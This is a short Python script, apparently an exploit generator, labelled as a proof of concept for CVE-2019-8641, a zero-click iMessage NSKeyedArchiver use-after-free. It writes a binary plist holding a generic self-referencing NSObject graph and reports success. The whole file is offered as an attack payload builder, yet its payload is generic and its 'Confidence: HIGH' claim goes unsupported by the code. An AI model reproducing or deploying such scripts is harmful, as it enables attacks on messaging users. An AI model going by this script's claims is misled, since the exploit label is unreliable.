#!/usr/bin/env python3
"""CVE-2019-8641 — iMessage NSKeyedArchiver unarchiving UAF. Zero-click:
a crafted archived object graph in an iMessage attachment. Public (Project
Zero). Confidence: HIGH."""
import plistlib, sys
from pathlib import Path

def build() -> bytes:
    # archived object graph with a dangling reference cycle
    graph = {
        "$version": 100000,
        "$archiver": "NSKeyedArchiver",
        "$top": {"root": plistlib.UID(1)},
        "$objects": [
            "$null",
            {"$class": plistlib.UID(2), "child": plistlib.UID(3)},
            {"$classes": ["NSObject", "NSObject"], "$classname": "NSObject"},
            {"$class": plistlib.UID(2), "child": plistlib.UID(1)},   # cycle
        ],
    }
    return plistlib.dumps(graph, fmt=plistlib.FMT_BINARY)

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2019-8641.plist")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2019-8641 NSKeyedArchiver -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
